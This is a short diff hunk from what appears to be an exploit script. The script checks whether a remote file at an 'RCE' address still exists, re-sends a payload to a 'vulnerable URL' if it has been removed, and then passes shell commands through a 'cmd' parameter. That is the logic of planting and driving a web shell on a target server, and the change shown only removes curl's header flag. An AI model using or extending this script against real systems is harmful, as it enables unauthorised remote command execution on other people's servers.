@@ -20,7 +20,7 @@ elif ! which jq >/dev/null ; then
 else
     # Ensure the file has not been wiped
     if ! curl -sI "$RCE" | grep 'HTTP/1.1 200 OK' > /dev/null; then
-        curl -si "$VULNERABLE_URL" -d "$PAYLOAD" >/dev/null
+        curl -s "$VULNERABLE_URL" -d "$PAYLOAD" >/dev/null
     fi
     
     curl -s "$RCE?cmd=${URL_ENCODED_COMMAND}"
